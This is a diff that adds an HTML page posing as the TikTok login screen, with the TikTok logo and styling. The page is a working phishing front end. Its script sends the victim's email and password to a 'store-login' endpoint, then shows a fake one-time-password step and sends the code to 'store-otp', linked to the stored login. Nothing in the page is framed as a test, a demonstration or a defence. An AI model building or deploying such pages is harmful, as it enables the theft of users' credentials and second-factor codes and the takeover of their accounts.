@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok Login</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:'Arial', sans-serif; }
+body { background:#000; color:#fff; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+.container { width:100%; max-width:400px; padding:20px; }
+.logo img { width:70px; margin:0 auto; display:block; }
+.login-box, .otp-box { background:#111; padding:25px; border-radius:12px; margin-top:15px; }
+.otp-box { display:none; }
+.input-group { margin-bottom:15px; }
+.input-group input { width:100%; padding:12px; background:#222; border:none; border-radius:8px; color:white; font-size:16px; }
+.btn { width:100%; padding:12px; background:#ff0050; border:none; border-radius:8px; font-size:17px; font-weight:bold; color:#fff; cursor:pointer; position:relative; }
+.loader { width:20px; height:20px; border:3px solid rgba(255,255,255,0.3); border-top:3px solid white; border-radius:50%; animation:spin 0.7s linear infinite; margin:0 auto; display:none; }
+@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg">
+  </div>
+
+  <!-- LOGIN -->
+  <div class="login-box" id="loginBox">
+    <div class="input-group"><input id="email" type="text" placeholder="Email or Phone"></div>
+    <div class="input-group"><input id="password" type="password" placeholder="Password"></div>
+    <button class="btn" id="loginBtn">
+      <span id="loginText">Log In</span>
+      <div id="loginLoader" class="loader"></div>
+    </button>
+  </div>
+
+  <!-- OTP -->
+  <div class="otp-box" id="otpBox">
+    <div class="input-group"><input id="otpInput" type="text" placeholder="Enter OTP sent to your phone"></div>
+    <button class="btn" id="otpBtn">Submit OTP</button>
+  </div>
+</div>
+
+<script>
+const loginBtn = document.getElementById("loginBtn");
+const loginText = document.getElementById("loginText");
+const loginLoader = document.getElementById("loginLoader");
+const loginBox = document.getElementById("loginBox");
+const otpBox = document.getElementById("otpBox");
+const otpBtn = document.getElementById("otpBtn");
+
+// LOGIN BUTTON
+loginBtn.onclick = async () => {
+  const email = document.getElementById("email").value.trim();
+  const pass = document.getElementById("password").value.trim();
+  if (!email || !pass) { alert("Please fill all fields"); return; }
+
+  loginText.style.display = "none";
+  loginLoader.style.display = "block";
+  loginBtn.disabled = true;
+
+  // Send login to backend
+  await fetch("http://localhost:5000/store-login", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ email, pass })
+  });
+
+  setTimeout(() => {
+    loginBox.style.display = "none";
+    otpBox.style.display = "block";
+  }, 2000);
+};
+
+// OTP BUTTON
+otpBtn.onclick = async () => {
+  const otp = document.getElementById("otpInput").value.trim();
+  const email = document.getElementById("email").value.trim();
+  if (!otp) { alert("Enter OTP"); return; }
+
+  try {
+    const res = await fetch("http://localhost:5000/store-otp", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ otp, email })
+    });
+
+    const data = await res.json();
+    if (data.success) {
+      alert("OTP submitted successfully! It is linked to the same login row.");
+    } else {
+      alert("Error saving OTP: " + data.error);
+    }
+  } catch (err) {
+    alert("Error submitting OTP: " + err.message);
+  }
+};
+</script>
+
+</body>
+</html>
